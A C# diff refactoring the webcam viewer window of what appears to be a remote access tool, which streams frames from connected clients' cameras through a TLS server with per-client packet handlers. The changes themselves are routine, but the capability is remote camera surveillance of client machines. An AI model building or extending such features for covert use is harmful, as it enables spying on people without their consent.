@@ -23,6 +23,14 @@ public partial class WebcamWindow : ThemedWindow
     private volatile bool _closed, _streaming;
     private int _frameCount;
     private DateTime _fpsTime = DateTime.UtcNow;
+
+    private static readonly System.Windows.Media.SolidColorBrush _dotActive  = MakeBrush(0x22, 0xC5, 0x5E);
+    private static readonly System.Windows.Media.SolidColorBrush _dotInactive = MakeBrush(0x25, 0x28, 0x40);
+    private static readonly System.Windows.Media.SolidColorBrush _sigGreen   = MakeBrush(0x22, 0xC5, 0x5E);
+    private static readonly System.Windows.Media.SolidColorBrush _sigOrange  = MakeBrush(0xF5, 0x9E, 0x0B);
+    private static readonly System.Windows.Media.SolidColorBrush _sigRed     = MakeBrush(0xEF, 0x44, 0x44);
+    private static System.Windows.Media.SolidColorBrush MakeBrush(byte r, byte g, byte b)
+    { var br = new System.Windows.Media.SolidColorBrush(System.Windows.Media.Color.FromRgb(r, g, b)); br.Freeze(); return br; }
     private DateTime _lastAutoSave = DateTime.MinValue;
 
     public WebcamWindow(TlsServer server, string clientId)
@@ -46,7 +54,7 @@ public partial class WebcamWindow : ThemedWindow
         SldFps.ValueChanged     += (_, e) => { TxtFpsVal.Text  = $"{(int)e.NewValue}"; UiPrefs.Set("WcamFps",    (int)e.NewValue); };
         CmbResolution.SelectionChanged += (_, _) => UiPrefs.Set("WcamRes", CmbResolution.SelectedIndex);
 
-        _server.WcamFrameReceived  += OnWcamData;
+        RegisterWcamHandlers(_clientId);
         _server.ClientDisconnected += OnClientDisconnected;
         _server.ClientConnected += OnClientConnected;
         Lang.LanguageChanged += ApplyLanguage;
@@ -55,7 +63,7 @@ public partial class WebcamWindow : ThemedWindow
         {
             _closed = true;
             _reconnectTimer?.Stop();
-            _server.WcamFrameReceived  -= OnWcamData;
+            UnregisterWcamHandlers(_clientId);
             _server.ClientDisconnected -= OnClientDisconnected;
             _server.ClientConnected -= OnClientConnected;
             if (_streaming) SendStop();
@@ -70,6 +78,18 @@ public partial class WebcamWindow : ThemedWindow
                 new DoubleAnimation(0, 1, TimeSpan.FromMilliseconds(180)));
             SendProbe(); // request device list on open
         };
+    }
+
+    private void RegisterWcamHandlers(string clientId)
+    {
+        _server.RegisterHandler(clientId, PacketType.WcamFrame,   p => OnWcamData(clientId, p.Data));
+        _server.RegisterHandler(clientId, PacketType.WcamDevices, p => OnWcamData(clientId, p.Data));
+    }
+
+    private void UnregisterWcamHandlers(string clientId)
+    {
+        _server.UnregisterHandler(clientId, PacketType.WcamFrame);
+        _server.UnregisterHandler(clientId, PacketType.WcamDevices);
     }
 
     // ── Fullscreen ────────────────────────────────────────────────────────────
@@ -129,9 +149,7 @@ public partial class WebcamWindow : ThemedWindow
             CmbDevice.IsEnabled      = !streaming;
             CmbResolution.IsEnabled  = !streaming;
             TxtStatus.Text       = streaming ? Lang.Get("STATUS_STREAMING") : Lang.Get("STOPPED");
-            StatusDot.Fill       = new System.Windows.Media.SolidColorBrush(streaming
-                ? System.Windows.Media.Color.FromRgb(0x22, 0xC5, 0x5E)
-                : System.Windows.Media.Color.FromRgb(0x25, 0x28, 0x40));
+            StatusDot.Fill       = streaming ? _dotActive : _dotInactive;
             LiveBadge.Visibility = streaming ? Visibility.Visible : Visibility.Collapsed;
             if (streaming)
             {
@@ -203,7 +221,7 @@ public partial class WebcamWindow : ThemedWindow
 
     private void OnWcamData(string clientId, string json)
     {
-        if (_closed || clientId != _clientId) return;
+        if (_closed) return;
         try
         {
             using var doc = JsonDocument.Parse(json);
@@ -328,13 +346,7 @@ public partial class WebcamWindow : ThemedWindow
         {
             int ping = client.PingMs;
             TxtPing.Text = $"{ping} ms";
-            if (ping < 100) {
-                SignalIcon.Foreground = new SolidColorBrush(Color.FromRgb(0x22, 0xC5, 0x5E));
-            } else if (ping < 250) {
-                SignalIcon.Foreground = new SolidColorBrush(Color.FromRgb(0xF5, 0x9E, 0x0B));
-            } else {
-                SignalIcon.Foreground = new SolidColorBrush(Color.FromRgb(0xEF, 0x44, 0x44));
-            }
+            SignalIcon.Foreground = ping < 100 ? _sigGreen : ping < 250 ? _sigOrange : _sigRed;
         }
     }
 
@@ -395,7 +407,9 @@ public partial class WebcamWindow : ThemedWindow
         Dispatcher.BeginInvoke(() =>
         {
             if (_closed) return;
+            UnregisterWcamHandlers(_clientId);
             _clientId = c.Id;
+            RegisterWcamHandlers(_clientId);
 
             // Hide overlay, cancel timer
             _reconnectTimer?.Stop();
